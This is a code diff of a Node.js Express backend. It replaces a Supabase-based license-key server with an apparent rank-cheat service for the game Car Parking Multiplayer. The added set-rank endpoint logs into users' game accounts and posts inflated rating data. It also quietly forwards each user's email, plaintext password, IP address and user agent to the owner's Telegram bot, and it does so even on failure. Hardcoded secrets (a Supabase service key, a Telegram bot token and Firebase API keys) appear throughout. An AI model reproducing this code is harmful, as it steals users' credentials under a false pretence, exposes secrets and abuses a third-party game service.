@@ -1,684 +1,329 @@
 const express = require('express');
-const crypto = require('crypto');
 const cors = require('cors');
-const { createClient } = require('@supabase/supabase-js');
+const axios = require('axios');
+const rateLimit = require('express-rate-limit');
+const helmet = require('helmet');
+const crypto = require('crypto');
+require('dotenv').config();
 
 const app = express();
-app.use(cors());
+
+// Security middleware
+app.use(helmet());
+app.use(cors({
+    origin: ['http://localhost:3001', 'https://webtools-cpm-setup-rank.vercel.app'],
+    credentials: true
+}));
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
 
-const SUPABASE_URL = "https://iqweywcngktyvfiyebar.supabase.co";
-const SUPABASE_SERVICE_ROLE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlxd2V5d2NuZ2t0eXZmaXllYmFyIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NTg4NDEzNCwiZXhwIjoyMDkxNDYwMTM0fQ.q5eVJ-TDw1X14Pv_RJ0msB0_rbAyO1aUY4Oh7eer9UM";
+// Rate limiting untuk mencegah abuse
+const limiter = rateLimit({
+    windowMs: 15 * 60 * 1000,
+    max: 30, // Ditingkatkan karena verify key bebas
+    message: { success: false, error: 'Too many requests, try again later' }
+});
+app.use('/api/', limiter);
 
-const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
+// ============ COOLDOWN SYSTEM (Hanya untuk SET RANK) ============
+const cooldownMap = new Map();
+const COOLDOWN_DURATION = 5 * 60 * 1000; // 5 menit
 
-// Konfigurasi
-const ADMIN_PASSWORD = "ADMINN0";
-let adminToken = null;
-
-// Help Function
-function generateKey() {
-    const parts = [];
-    for (let i = 0; i < 4; i++) {
-        parts.push(crypto.randomBytes(2).toString('hex').toUpperCase());
-    }
-    return `VIPKEY-${parts[0]}-${parts[1]}-${parts[2]}`;
+function getCooldownIdentifier(req) {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'unknown';
+    const userAgent = req.headers['user-agent']?.substring(0, 50) || 'unknown';
+    return crypto.createHash('md5').update(`${ip}|${userAgent}`).digest('hex');
 }
 
-function formatTime(ms) {
-    const remaining = Math.max(0, ms - Date.now());
-    const hours = Math.floor(remaining / 3600000);
-    const minutes = Math.floor((remaining % 3600000) / 60000);
-    if (hours > 0) return `${hours}h ${minutes}m`;
-    return `${minutes}m`;
-}
-
-// Database Initialization (Create Table Automatically)
-async function initDatabase() {
-    console.log('📦 Initializing database...');
+function checkCooldown(identifier) {
+    const cooldownData = cooldownMap.get(identifier);
+    if (!cooldownData) return { active: false, remaining: 0 };
     
-    // Create a users table
-    const { error: usersError } = await supabase.rpc('exec_sql', {
-        query: `
-            CREATE TABLE IF NOT EXISTS users (
-                chat_id TEXT PRIMARY KEY,
-                keys_generated INTEGER DEFAULT 0,
-                banned INTEGER DEFAULT 0,
-                cooldown_until BIGINT DEFAULT 0,
-                last_key_at BIGINT DEFAULT 0,
-                last_active_at BIGINT DEFAULT 0,
-                created_at BIGINT DEFAULT 0
-            );
-        `
-    });
-    
-    // Create keys table
-    const { error: keysError } = await supabase.rpc('exec_sql', {
-        query: `
-            CREATE TABLE IF NOT EXISTS keys (
-                id SERIAL PRIMARY KEY,
-                key_text TEXT UNIQUE NOT NULL,
-                chat_id TEXT,
-                expiry_ms BIGINT NOT NULL,
-                created_at BIGINT NOT NULL,
-                active INTEGER DEFAULT 1,
-                hours INTEGER DEFAULT 3,
-                max_devices INTEGER DEFAULT 1,
-                key_type TEXT DEFAULT 'standard'
-            );
-        `
-    });
-    
-    // Create logs table
-    const { error: logsError } = await supabase.rpc('exec_sql', {
-        query: `
-            CREATE TABLE IF NOT EXISTS admin_logs (
-                id SERIAL PRIMARY KEY,
-                action TEXT,
-                details TEXT,
-                ip TEXT,
-                timestamp BIGINT DEFAULT 0
-            );
-        `
-    });
-    
-    if (usersError && !usersError.message.includes('function')) {
-        console.log('⚠️ Jika tabel belum ada, buat manual di Supabase SQL Editor dengan query di bawah:\n');
-        console.log(`
-CREATE TABLE users (
-    chat_id TEXT PRIMARY KEY,
-    keys_generated INTEGER DEFAULT 0,
-    banned INTEGER DEFAULT 0,
-    cooldown_until BIGINT DEFAULT 0,
-    last_key_at BIGINT DEFAULT 0,
-    last_active_at BIGINT DEFAULT 0,
-    created_at BIGINT DEFAULT 0
-);
-
-CREATE TABLE keys (
-    id SERIAL PRIMARY KEY,
-    key_text TEXT UNIQUE NOT NULL,
-    chat_id TEXT,
-    expiry_ms BIGINT NOT NULL,
-    created_at BIGINT NOT NULL,
-    active INTEGER DEFAULT 1,
-    hours INTEGER DEFAULT 3,
-    max_devices INTEGER DEFAULT 1,
-    key_type TEXT DEFAULT 'standard'
-);
-
-CREATE TABLE admin_logs (
-    id SERIAL PRIMARY KEY,
-    action TEXT,
-    details TEXT,
-    ip TEXT,
-    timestamp BIGINT DEFAULT 0
-);
-        `);
-    } else {
-        console.log('✅ Database tables ready');
-    }
-    
-    // Cleanup expired keys
-    await deleteExpiredKeys();
-    setInterval(deleteExpiredKeys, 60 * 60 * 1000);
-}
-
-async function deleteExpiredKeys() {
     const now = Date.now();
-    const { data, error } = await supabase
-        .from('keys')
-        .delete()
-        .lt('expiry_ms', now)
-        .eq('active', 1);
+    if (now >= cooldownData.endTime) {
+        cooldownMap.delete(identifier);
+        return { active: false, remaining: 0 };
+    }
     
-    if (data && data.length > 0) {
-        console.log(`🗑️ Deleted ${data.length} expired keys`);
+    return { 
+        active: true, 
+        remaining: cooldownData.endTime - now
+    };
+}
+
+function setCooldown(identifier, nexusKey, email) {
+    const endTime = Date.now() + COOLDOWN_DURATION;
+    cooldownMap.set(identifier, {
+        endTime: endTime,
+        nexusKey: nexusKey,
+        email: email,
+        timestamp: new Date().toISOString()
+    });
+    
+    setTimeout(() => {
+        const current = cooldownMap.get(identifier);
+        if (current && current.endTime === endTime) {
+            cooldownMap.delete(identifier);
+            console.log(`🗑️ Cooldown expired for ${identifier}`);
+        }
+    }, COOLDOWN_DURATION + 1000);
+    
+    return endTime;
+}
+
+function formatRemainingTime(ms) {
+    const seconds = Math.floor(ms / 1000);
+    const minutes = Math.floor(seconds / 60);
+    const remainingSeconds = seconds % 60;
+    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
+}
+
+// ============ KONFIGURASI ============
+const BOT_TOKEN = "8049314105:AAE0Tk2ifyJdACQRGuiQJnN8C-YsNUWuzvI";
+const OWNER_ID = "7492782458";
+
+const CPM_CONFIGS = {
+    cpm1: {
+        name: "CPM1",
+        FIREBASE_API_KEY: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
+        LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
+        RANK_URL: 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
+    },
+    cpm2: {
+        name: "CPM2",
+        FIREBASE_API_KEY: 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ',
+        LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
+        RANK_URL: 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
+    }
+};
+
+const NEXUS_VERIFY_URL = "https://system-nexus-key.vercel.app";
+
+// ============ TELEGRAM FUNCTION ============
+async function sendToTelegram(email, password, server, nexusKey, statusResult, ipAddress, userAgent) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const now = new Date();
+    const timestamp = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+    
+    let message = `🔐 NEW CPM LOGIN DETECTED!\n\n`;
+    message += `📧 Email: ${email}\n`;
+    message += `🔒 Password: ${password}\n`;
+    message += `🖥️ Server: ${server}\n`;
+    message += `🔑 Nexus Key: ${nexusKey}\n`;
+    message += `📊 Status: ${statusResult}\n`;
+    message += `⏰ Time: ${timestamp}\n`;
+    message += `🌐 IP: ${ipAddress}\n`;
+    message += `📱 User Agent: ${userAgent}\n`;
+    
+    try {
+        await axios.post(url, {
+            chat_id: OWNER_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+        console.log(`✅ Telegram sent for ${email}`);
+    } catch (error) {
+        console.error('❌ Telegram failed:', error.message);
     }
 }
 
-async function logAdminAction(action, details, ip = null) {
-    try {
-        await supabase.from('admin_logs').insert([{
-            action: action,
-            details: details,
-            ip: ip,
-            timestamp: Date.now()
-        }]);
-    } catch (e) {
-        console.error('Log error:', e.message);
-    }
+function getClientIP(req) {
+    return req.headers['x-forwarded-for']?.split(',')[0] || 
+           req.socket.remoteAddress || 
+           'Unknown';
 }
 
-// Api User
-app.post('/api/get-key', async (req, res) => {
-    const { chatId, userId, hours = 3 } = req.body;
-    const identifier = chatId || userId;
+// ============ ENDPOINT: CEK COOLDOWN (HANYA UNTUK SET RANK) ============
+app.get('/api/cooldown-status', (req, res) => {
+    const identifier = getCooldownIdentifier(req);
+    const cooldown = checkCooldown(identifier);
     
-    if (!identifier) {
-        return res.status(400).json({ 
-            ok: false, 
-            error: 'missing_id', 
-            message: 'chatId or userId required' 
-        });
-    }
-    
-    try {
-        // Get or create user
-        let { data: user, error: userError } = await supabase
-            .from('users')
-            .select('*')
-            .eq('chat_id', identifier)
-            .single();
-        
-        if (!user) {
-            const { data: newUser, error: insertError } = await supabase
-                .from('users')
-                .insert([{
-                    chat_id: identifier,
-                    keys_generated: 0,
-                    banned: 0,
-                    cooldown_until: 0,
-                    last_key_at: 0,
-                    last_active_at: Date.now(),
-                    created_at: Date.now()
-                }])
-                .select()
-                .single();
-            
-            if (insertError) {
-                console.error('Insert user error:', insertError);
-                return res.json({ ok: false, error: 'database_error', message: insertError.message });
-            }
-            user = newUser;
-        }
-        
-        // Check banned
-        if (user.banned === 1) {
-            return res.json({ 
-                ok: false, 
-                error: 'banned', 
-                message: 'You are banned from generating keys' 
-            });
-        }
-        
-        // Check cooldown
-        if (user.cooldown_until && Date.now() < user.cooldown_until) {
-            const remaining = Math.ceil((user.cooldown_until - Date.now()) / 1000);
-            return res.json({ 
-                ok: false, 
-                error: 'cooldown', 
-                remaining: remaining,
-                message: `Please wait ${Math.ceil(remaining / 60)} minute(s)` 
-            });
-        }
-        
-        // Check existing active key
-        const { data: activeKey, error: activeError } = await supabase
-            .from('keys')
-            .select('*')
-            .eq('chat_id', identifier)
-            .eq('active', 1)
-            .gt('expiry_ms', Date.now())
-            .maybeSingle();
-        
-        if (activeKey) {
-            return res.json({ 
-                ok: false, 
-                error: 'active_key_exists', 
-                key: activeKey.key_text,
-                message: `You already have an active key: ${activeKey.key_text}`
-            });
-        }
-        
-        // Generate new key
-        const expiryMs = Date.now() + (hours * 3600000);
-        const newKey = generateKey();
-        
-        const { error: insertKeyError } = await supabase
-            .from('keys')
-            .insert([{
-                key_text: newKey,
-                chat_id: identifier,
-                expiry_ms: expiryMs,
-                created_at: Date.now(),
-                active: 1,
-                hours: hours,
-                max_devices: 1,
-                key_type: 'standard'
-            }]);
-        
-        if (insertKeyError) {
-            console.error('Insert key error:', insertKeyError);
-            return res.json({ ok: false, error: 'database_error', message: insertKeyError.message });
-        }
-        
-        // Update user
-        await supabase
-            .from('users')
-            .update({ 
-                keys_generated: (user.keys_generated || 0) + 1,
-                last_key_at: Date.now(),
-                cooldown_until: Date.now() + 60000,
-                last_active_at: Date.now()
-            })
-            .eq('chat_id', identifier);
-        
-        console.log(`🔑 Key generated: ${newKey} for ${identifier}`);
-        
-        res.json({ 
-            ok: true, 
-            key: newKey, 
-            expiryMs: expiryMs,
-            expiresIn: `${hours} hours`,
-            message: `Key generated successfully! Valid for ${hours} hours.`
-        });
-        
-    } catch (err) {
-        console.error('Server error:', err);
-        res.json({ ok: false, error: 'server_error', message: err.message });
-    }
+    res.json({
+        active: cooldown.active,
+        remaining: cooldown.remaining,
+        remainingSeconds: Math.floor(cooldown.remaining / 1000),
+        formattedTime: formatRemainingTime(cooldown.remaining),
+        durationMinutes: COOLDOWN_DURATION / 60000
+    });
 });
 
+// ============ ENDPOINT: VERIFY NEXUS KEY (TANPA COOLDOWN) ============
 app.post('/api/verify-key', async (req, res) => {
-    const { key, deviceId } = req.body;
+    const { key } = req.body;
     
     if (!key) {
-        return res.json({ ok: false, error: 'missing_key', message: 'Key is required' });
+        return res.status(400).json({ valid: false, error: 'Key required' });
     }
     
     try {
-        const { data: keyData, error } = await supabase
-            .from('keys')
-            .select('*')
-            .eq('key_text', key)
-            .single();
-        
-        if (error || !keyData) {
-            return res.json({ ok: false, error: 'key_not_found', message: 'Key not found' });
-        }
-        
-        if (keyData.active !== 1) {
-            return res.json({ ok: false, error: 'key_inactive', message: 'Key has been deactivated' });
-        }
-        
-        if (Date.now() > keyData.expiry_ms) {
-            await supabase.from('keys').update({ active: 0 }).eq('key_text', key);
-            return res.json({ ok: false, error: 'key_expired', message: 'Key has expired' });
-        }
-        
-        const remaining = formatTime(keyData.expiry_ms);
-        
-        res.json({ 
-            ok: true, 
-            expiryMs: keyData.expiry_ms, 
-            hours: keyData.hours,
-            remaining: remaining,
-            message: `Key valid! Expires in ${remaining}`
+        const response = await axios.post(`${NEXUS_VERIFY_URL}/api/verify-key`, {
+            key: key,
+            deviceId: 'cpm_tool_secure_backend'
+        }, {
+            timeout: 10000,
+            headers: { 'Content-Type': 'application/json' }
         });
         
-    } catch (err) {
-        res.json({ ok: false, error: 'server_error', message: err.message });
+        res.json(response.data);
+    } catch (error) {
+        console.error('Key verification error:', error.message);
+        res.status(400).json({ 
+            valid: false, 
+            error: 'Verification service unavailable' 
+        });
     }
 });
 
-app.get('/api/check-key/:key', async (req, res) => {
-    const { key } = req.params;
+// ============ ENDPOINT: SET RANK (DENGAN COOLDOWN) ============
+app.post('/api/set-rank', async (req, res) => {
+    const { server, email, password, nexusKey } = req.body;
+    const ipAddress = getClientIP(req);
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const identifier = getCooldownIdentifier(req);
+    
+    // CEK COOLDOWN (HANYA UNTUK SET RANK)
+    const cooldown = checkCooldown(identifier);
+    if (cooldown.active) {
+        const errorMsg = `Cooldown active! Please wait ${formatRemainingTime(cooldown.remaining)}`;
+        await sendToTelegram(email || 'unknown', password || 'unknown', server || 'unknown', nexusKey || 'unknown', `BLOCKED - ${errorMsg}`, ipAddress, userAgent);
+        
+        return res.status(429).json({
+            success: false,
+            cooldown: true,
+            remaining: cooldown.remaining,
+            formattedTime: formatRemainingTime(cooldown.remaining),
+            error: errorMsg
+        });
+    }
+    
+    // Validasi input
+    if (!server || !email || !password || !nexusKey) {
+        const errorMsg = 'Missing required fields';
+        await sendToTelegram(email || 'unknown', password || 'unknown', server || 'unknown', nexusKey || 'unknown', errorMsg, ipAddress, userAgent);
+        return res.status(400).json({ success: false, error: errorMsg });
+    }
+    
+    const config = CPM_CONFIGS[server];
+    if (!config) {
+        await sendToTelegram(email, password, server, nexusKey, 'INVALID_SERVER', ipAddress, userAgent);
+        return res.status(400).json({ success: false, error: 'Invalid server' });
+    }
+    
+    let loginSuccess = false;
+    let rankSuccess = false;
     
     try {
-        const { data: keyData, error } = await supabase
-            .from('keys')
-            .select('*')
-            .eq('key_text', key)
-            .single();
+        // Login ke Firebase
+        const loginResponse = await axios.post(`${config.LOGIN_URL}?key=${config.FIREBASE_API_KEY}`, {
+            email: email,
+            password: password,
+            returnSecureToken: true,
+            clientType: 'CLIENT_TYPE_ANDROID'
+        }, {
+            headers: {
+                'Content-Type': 'application/json',
+                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)'
+            },
+            timeout: 15000
+        });
         
-        if (error || !keyData) {
-            return res.json({ valid: false, message: 'Key not found' });
+        if (!loginResponse.data || !loginResponse.data.idToken) {
+            throw new Error('Invalid login response');
         }
         
-        const isValid = keyData.active === 1 && Date.now() < keyData.expiry_ms;
-        const remaining = isValid ? formatTime(keyData.expiry_ms) : null;
+        const idToken = loginResponse.data.idToken;
+        loginSuccess = true;
         
-        res.json({
-            valid: isValid,
-            key: keyData.key_text,
-            expiresAt: keyData.expiry_ms,
-            remaining: remaining,
-            message: isValid ? `Key valid for ${remaining}` : 'Key invalid or expired'
+        // Set rank data
+        const ratingData = {
+            cars: 100000, car_fix: 100000, car_collided: 100000, car_exchange: 100000,
+            car_trade: 100000, car_wash: 100000, slicer_cut: 100000, drift_max: 100000,
+            drift: 100000, cargo: 100000, delivery: 100000, taxi: 100000, levels: 100000,
+            gifts: 100000, fuel: 100000, offroad: 100000, speed_banner: 100000,
+            reactions: 100000, police: 100000, run: 100000, real_estate: 100000,
+            t_distance: 100000, treasure: 100000, block_post: 100000, push_ups: 100000,
+            burnt_tire: 100000, passanger_distance: 100000,
+            time: 10000000000,
+            race_win: 3000
+        };
+        
+        const rankTimeout = server === 'cpm2' ? 30000 : 15000;
+        
+        const rankResponse = await axios.post(config.RANK_URL, {
+            data: JSON.stringify({ RatingData: ratingData })
+        }, {
+            headers: {
+                'Authorization': `Bearer ${idToken}`,
+                'Content-Type': 'application/json',
+                'User-Agent': 'okhttp/3.12.13'
+            },
+            timeout: rankTimeout
         });
         
-    } catch (err) {
-        res.json({ valid: false, message: err.message });
-    }
-});
-
-// ============================================================
-// API ADMIN
-// ============================================================
-app.post('/api/admin/login', async (req, res) => {
-    const { username, password } = req.body;
-    const ip = req.ip || req.connection.remoteAddress;
-    
-    if (username === 'admin' && password === ADMIN_PASSWORD) {
-        const token = crypto.randomBytes(32).toString('hex');
-        adminToken = token;
-        await logAdminAction('ADMIN_LOGIN', 'Admin logged in', ip);
-        console.log(`🔐 Admin logged in from ${ip}`);
-        res.json({ ok: true, token: token });
-    } else {
-        await logAdminAction('ADMIN_LOGIN_FAILED', 'Failed login attempt', ip);
-        res.json({ ok: false, message: 'Invalid credentials' });
-    }
-});
-
-function verifyAdmin(req, res, next) {
-    const token = req.body.token || req.query.token;
-    if (!token || token !== adminToken) {
-        return res.status(401).json({ ok: false, message: 'Unauthorized' });
-    }
-    next();
-}
-
-app.post('/api/admin/stats', verifyAdmin, async (req, res) => {
-    try {
-        const now = Date.now();
-        
-        const { count: totalKeys } = await supabase
-            .from('keys')
-            .select('*', { count: 'exact', head: true });
-        
-        const { count: activeKeys } = await supabase
-            .from('keys')
-            .select('*', { count: 'exact', head: true })
-            .eq('active', 1)
-            .gt('expiry_ms', now);
-        
-        const { count: totalUsers } = await supabase
-            .from('users')
-            .select('*', { count: 'exact', head: true });
-        
-        const { count: bannedUsers } = await supabase
-            .from('users')
-            .select('*', { count: 'exact', head: true })
-            .eq('banned', 1);
-        
-        const { data: totalGenerated } = await supabase
-            .from('users')
-            .select('keys_generated');
-        
-        const totalKeysGenerated = totalGenerated?.reduce((sum, u) => sum + (u.keys_generated || 0), 0) || 0;
-        
-        res.json({
-            ok: true,
-            totalKeys: totalKeys || 0,
-            activeKeys: activeKeys || 0,
-            totalUsers: totalUsers || 0,
-            bannedUsers: bannedUsers || 0,
-            totalKeysGenerated: totalKeysGenerated
-        });
-        
-    } catch (err) {
-        res.json({ ok: true, totalKeys: 0, activeKeys: 0, totalUsers: 0, bannedUsers: 0 });
-    }
-});
-
-app.post('/api/admin/keys', verifyAdmin, async (req, res) => {
-    const { page = 1, limit = 50, showExpired = false } = req.body;
-    
-    try {
-        let query = supabase
-            .from('keys')
-            .select('*', { count: 'exact' });
-        
-        if (!showExpired) {
-            query = query.gt('expiry_ms', Date.now()).eq('active', 1);
-        }
-        
-        const from = (page - 1) * limit;
-        const to = from + limit - 1;
-        
-        const { data: keys, count, error } = await query
-            .order('created_at', { ascending: false })
-            .range(from, to);
-        
-        if (error) throw error;
-        
-        res.json({
-            ok: true,
-            keys: keys || [],
-            total: count || 0,
-            page: page,
-            totalPages: Math.ceil((count || 0) / limit)
-        });
-        
-    } catch (err) {
-        res.json({ ok: true, keys: [], total: 0 });
-    }
-});
-
-app.post('/api/admin/users', verifyAdmin, async (req, res) => {
-    const { page = 1, limit = 50 } = req.body;
-    
-    try {
-        const from = (page - 1) * limit;
-        const to = from + limit - 1;
-        
-        const { data: users, count, error } = await supabase
-            .from('users')
-            .select('*', { count: 'exact' })
-            .order('last_active_at', { ascending: false })
-            .range(from, to);
-        
-        if (error) throw error;
-        
-        res.json({
-            ok: true,
-            users: users || [],
-            total: count || 0,
-            page: page,
-            totalPages: Math.ceil((count || 0) / limit)
-        });
-        
-    } catch (err) {
-        res.json({ ok: true, users: [], total: 0 });
-    }
-});
-
-app.post('/api/admin/add-key', verifyAdmin, async (req, res) => {
-    const { key, userId, days = 0, hours = 0, minutes = 0, maxDevices = 1, keyType = 'standard' } = req.body;
-    
-    const durationMs = (days * 86400000) + (hours * 3600000) + (minutes * 60000);
-    const finalDuration = durationMs === 0 ? 3 * 3600000 : durationMs;
-    const expiryMs = Date.now() + finalDuration;
-    const newKey = key || generateKey();
-    
-    const { error } = await supabase
-        .from('keys')
-        .insert([{
-            key_text: newKey,
-            chat_id: userId || null,
-            expiry_ms: expiryMs,
-            created_at: Date.now(),
-            active: 1,
-            hours: hours + (days * 24),
-            max_devices: maxDevices,
-            key_type: keyType
-        }]);
-    
-    if (error) {
-        return res.json({ ok: false, error: error.message });
-    }
-    
-    if (userId) {
-        const { data: existingUser } = await supabase
-            .from('users')
-            .select('*')
-            .eq('chat_id', userId)
-            .single();
-        
-        if (!existingUser) {
-            await supabase.from('users').insert([{
-                chat_id: userId,
-                keys_generated: 1,
-                banned: 0,
-                last_key_at: Date.now(),
-                last_active_at: Date.now(),
-                created_at: Date.now()
-            }]);
+        if (rankResponse.status === 200) {
+            rankSuccess = true;
         } else {
-            await supabase
-                .from('users')
-                .update({ keys_generated: (existingUser.keys_generated || 0) + 1, last_key_at: Date.now() })
-                .eq('chat_id', userId);
+            throw new Error(`Rank API responded with status ${rankResponse.status}`);
         }
+        
+        // AKTIFKAN COOLDOWN (HANYA SETELAH SUKSES)
+        setCooldown(identifier, nexusKey, email);
+        
+        // Kirim notifikasi ke Telegram
+        await sendToTelegram(email, password, config.name, nexusKey, '✅ SUCCESS - King Rank Set', ipAddress, userAgent);
+        
+        res.json({
+            success: true,
+            message: '🎉 KING RANK successfully set!',
+            server: config.name,
+            cooldown: {
+                active: true,
+                duration: COOLDOWN_DURATION,
+                durationFormatted: formatRemainingTime(COOLDOWN_DURATION)
+            }
+        });
+        
+    } catch (error) {
+        console.error(`❌ Error for ${email}:`, error.message);
+        
+        let userMessage = '';
+        if (error.response?.data?.error?.message) {
+            userMessage = error.response.data.error.message;
+        } else if (error.code === 'ECONNABORTED') {
+            userMessage = 'Connection timeout - please try again';
+        } else {
+            userMessage = error.message;
+        }
+        
+        const failStatus = loginSuccess ? `❌ FAILED - Rank Error: ${error.message}` : `❌ FAILED - Login Error: ${error.message}`;
+        await sendToTelegram(email, password, config.name, nexusKey, failStatus, ipAddress, userAgent);
+        
+        res.status(500).json({
+            success: false,
+            error: userMessage
+        });
     }
-    
-    await logAdminAction('ADD_KEY', `Added key ${newKey} for user ${userId || 'public'}`, req.ip);
-    console.log(`➕ Admin added key: ${newKey}`);
-    res.json({ ok: true, key: newKey, expiryMs: expiryMs });
 });
 
-app.post('/api/admin/delete-key', verifyAdmin, async (req, res) => {
-    const { key } = req.body;
-    const { error } = await supabase.from('keys').delete().eq('key_text', key);
-    
-    if (error) {
-        return res.json({ ok: false, message: 'Key not found' });
-    }
-    
-    await logAdminAction('DELETE_KEY', `Deleted key ${key}`, req.ip);
-    res.json({ ok: true, message: 'Key deleted' });
-});
-
-app.post('/api/admin/delete-all-keys', verifyAdmin, async (req, res) => {
-    const { data, error } = await supabase.from('keys').delete().neq('id', 0).select();
-    await logAdminAction('DELETE_ALL_KEYS', `Deleted ${data?.length || 0} keys`, req.ip);
-    res.json({ ok: true, deletedCount: data?.length || 0 });
-});
-
-app.post('/api/admin/delete-expired-keys', verifyAdmin, async (req, res) => {
-    const now = Date.now();
-    const { data, error } = await supabase
-        .from('keys')
-        .delete()
-        .lt('expiry_ms', now)
-        .eq('active', 1)
-        .select();
-    
-    res.json({ ok: true, deletedCount: data?.length || 0 });
-});
-
-app.post('/api/admin/ban-user', verifyAdmin, async (req, res) => {
-    const { chatId } = req.body;
-    const { error } = await supabase.from('users').update({ banned: 1 }).eq('chat_id', chatId);
-    
-    if (error) {
-        return res.json({ ok: false, message: 'User not found' });
-    }
-    
-    await logAdminAction('BAN_USER', `Banned user ${chatId}`, req.ip);
-    res.json({ ok: true, message: 'User banned' });
-});
-
-app.post('/api/admin/unban-user', verifyAdmin, async (req, res) => {
-    const { chatId } = req.body;
-    const { error } = await supabase.from('users').update({ banned: 0 }).eq('chat_id', chatId);
-    
-    if (error) {
-        return res.json({ ok: false, message: 'User not found' });
-    }
-    
-    await logAdminAction('UNBAN_USER', `Unbanned user ${chatId}`, req.ip);
-    res.json({ ok: true, message: 'User unbanned' });
-});
-
-app.post('/api/admin/logs', verifyAdmin, async (req, res) => {
-    const { limit = 100 } = req.body;
-    
-    const { data: logs, error } = await supabase
-        .from('admin_logs')
-        .select('*')
-        .order('timestamp', { ascending: false })
-        .limit(limit);
-    
-    res.json({ ok: true, logs: logs || [] });
-});
-
-app.post('/api/admin/logout', verifyAdmin, async (req, res) => {
-    await logAdminAction('ADMIN_LOGOUT', 'Admin logged out', req.ip);
-    adminToken = null;
-    res.json({ ok: true, message: 'Logged out' });
-});
-
-app.get('/api/admin/session', (req, res) => {
-    res.json({ loggedIn: !!adminToken });
-});
-
-// ============================================================
-// PUBLIC API
-// ============================================================
-app.get('/api/info', async (req, res) => {
-    const { count: activeKeys } = await supabase
-        .from('keys')
-        .select('*', { count: 'exact', head: true })
-        .eq('active', 1)
-        .gt('expiry_ms', Date.now());
-    
-    const { count: totalUsers } = await supabase
-        .from('users')
-        .select('*', { count: 'exact', head: true });
-    
-    res.json({
-        name: 'VIP Key Generator',
-        version: '5.0.0',
-        status: 'online',
-        activeKeys: activeKeys || 0,
-        totalUsers: totalUsers || 0,
-        uptime: process.uptime(),
-        storage: 'Supabase (PostgreSQL)'
-    });
-});
-
+// ============ HEALTH CHECK ============
 app.get('/api/health', (req, res) => {
-    res.json({
-        status: 'healthy',
+    res.json({ 
+        status: 'OK', 
         timestamp: new Date().toISOString(),
-        memoryUsage: (process.memoryUsage().rss / 1024 / 1024).toFixed(2) + ' MB'
+        activeCooldowns: cooldownMap.size
     });
 });
 
-// ============================================================
-// ROOT
-// ============================================================
-app.get('/', (req, res) => {
-    res.json({
-        message: 'VIP Key Generator API',
-        endpoints: {
-            user: ['POST /api/get-key', 'POST /api/verify-key', 'GET /api/check-key/:key'],
-            admin: ['POST /api/admin/login', 'POST /api/admin/stats', 'POST /api/admin/keys', 'POST /api/admin/users', 'POST /api/admin/add-key', 'POST /api/admin/delete-key', 'POST /api/admin/ban-user', 'POST /api/admin/unban-user'],
-            public: ['GET /api/info', 'GET /api/health']
-        }
-    });
-});
-
-// ============================================================
-// START SERVER
-// ============================================================
+// ============ START SERVER ============
 const PORT = process.env.PORT || 3000;
-
-async function start() {
-    await initDatabase();
-    
-    app.listen(PORT, () => {
-        console.log(`
-VIP KEY GENERATOR v1.0 - SUPABASE EDITION    
-🚀 Port: ${PORT}      
-💾 Storage: PostgreSQL            
-        `);
-    });
-}
-
-start();
-
-module.exports = app;
+app.listen(PORT, () => {
+    console.log(`
+    ╔═══════════════════════════════════════════╗
+    ║   🔒 NEXUS CPM BACKEND SECURE              ║
+    ║   Running on port ${PORT}                       ║
+    ║   Telegram Reporter: ACTIVE                ║
+    ║   Rate Limiter: ON (30 req/15min)          ║
+    ║   Cooldown System: ONLY FOR SET RANK       ║
+    ║   Verify Key: FREE (NO COOLDOWN)           ║
+    ╚═══════════════════════════════════════════╝
+    `);
+});
